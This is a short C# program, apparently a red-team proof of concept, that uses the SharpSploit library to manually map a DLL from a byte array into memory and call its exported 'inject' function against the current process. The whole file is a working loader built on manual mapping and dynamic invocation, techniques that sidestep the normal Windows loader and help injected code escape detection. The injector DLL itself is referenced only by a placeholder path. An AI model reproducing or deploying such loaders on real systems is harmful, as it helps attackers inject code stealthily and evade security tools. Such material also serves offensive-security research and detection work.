using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace NimSharpSploitMapper
{
    class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool inject(int pid);

        static void Main(string[] args)
        {
            int curPid = Process.GetCurrentProcess().Id;
            string path = @"C:\path\to\injector.dll";
            byte[] bytes = System.IO.File.ReadAllBytes(path);
            Console.WriteLine($"Size of DLL: {bytes.Length} \n");
            Console.WriteLine("[+] Mapping Test DLL from byte array and calling export! \n");
            SharpSploit.Execution.PE.PE_MANUAL_MAP mapping = SharpSploit.Execution.ManualMap.Map.MapModuleToMemory(bytes);
            Console.WriteLine("[>] Manually mapped DLL ModuleBase : 0x" + string.Format("{0:X}", mapping.ModuleBase.ToInt64()) + "\n");
            object[] FunctionArgs = { curPid };
            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(mapping.PEINFO, mapping.ModuleBase, "inject", typeof(inject), FunctionArgs);
            Console.WriteLine("Inject proc has been called!\n");
            Console.ReadLine();

        }
    }
}
